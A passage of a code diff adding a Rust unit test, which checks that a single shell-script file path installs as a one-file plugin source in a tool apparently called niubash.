+        let _ = fs::remove_dir_all(&temp);
+    }
+
+    // ── niubash#300: the bare-path positional form ──────────────────────────
+
+    /// A single .sh/.bash FILE path snapshot-copies into its own one-file
+    /// source tree (the wild file-source shape), same as a directory.
+    #[test]
+    fn single_file_path_installs_as_a_wild_source() {
+        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let temp = unique_temp_dir("single-file");
+        let origin = temp.join("myscript.bash");
+        fs::write(&origin, "myscript_fn() { :; }\n").unwrap();
+        let root = temp.join("sources");
+        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
+
+        let record = add_source(SourceInstallRequest {
+            id: Some("myscript".to_string()),
+            ..local_request(&origin)
+        })
+        .expect("a single-file path must install");
+        assert_eq!(record.adapter, "file", "{record:?}");
+        assert_eq!(record.ref_name, LOCAL_ORIGIN_REF);
+        assert!(record.path.join("myscript.bash").is_file());
+        let statuses = list_sources();
+        assert_eq!(statuses.len(), 1);
+        assert_eq!(statuses[0].asset_count, Some(1));
         let _ = fs::remove_dir_all(&temp);
     }
 }
